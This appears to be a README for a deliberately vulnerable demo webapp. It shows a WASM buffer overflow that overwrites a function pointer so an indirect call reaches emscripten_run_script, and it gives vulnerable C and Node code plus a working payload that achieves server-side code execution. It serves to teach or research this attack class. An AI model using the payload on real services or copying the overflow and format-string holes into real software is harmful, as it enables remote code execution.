# Indirect Call Redirection -> RCE

This webapp uses a WASM with a buffer overflow vulnerability that allows you to overwrite a function pointer used in an indirect call. Indirect calls in WASM are not subject to the same checks that direct function calls are, so one can redirect to an arbitrary function, such as `emscripten_run_script`, to achieve arbitrary code execution. Here, an attacker can thus achieve remote code execution.

## Vulnerability

WASM:
```c
...
typedef struct str_struct {
    char msg[64];              //64 bytes
    uint16_t msg_len;          //2 + 2 bytes
    void (*change)(char *);    //4 bytes
} str_t;
...
char* trigger(str_t *s) {
    s->change(s->msg);
    return s->msg;
}

void setMsg(str_t *s, char *msg, int n) {
    printf(msg);
    memcpy(&(s->msg), msg, n); //Buffer Overflow Possibility if n > 64
}

EMSCRIPTEN_KEEPALIVE
char* execute(char *msg, int n, int m) {
    str_t s;
    setMethod(&s, m);
    setMsg(&s, msg, n);
    return trigger(&s);
}
...
```

Javascript:
```javascript
...
const msg = decodeURIComponent(req.query.msg);
const n = Module.lengthBytesUTF8(msg);
...
res.send(Module.UTF8ToString(Module._execute(msgPtr, n, m))); //Called with n=len(msg)
...
```

Since `n` is set to the length of the incoming msg field, a message that is too long can result in `memcpy(&(s->msg), msg, n);` overwriting the function pointer `change`. This function pointer is then used in an indirect call on user controlled data `s->change(s->msg);`, allowing for execution of arbitrary functions on arbitrary data. One particularly powerful function that can be called is `emscripten_run_script`, which takes arbitrary javascript as input and executes it.

## Run

```
npm install
node server.js
```

You should see the address to `emscripten_run_script` printed on the console for demonstration purposes. Note this will not change across runs, as there is no ASLR in WASM.

The following payload works to achieve arbitrary RCE:

```console.log(%27>>>Server%20side%20code%20execution!!%27);//0123456789012345679%03%00%00%00```

Replace the last 4 bytes with the appropriate address printed at the start.
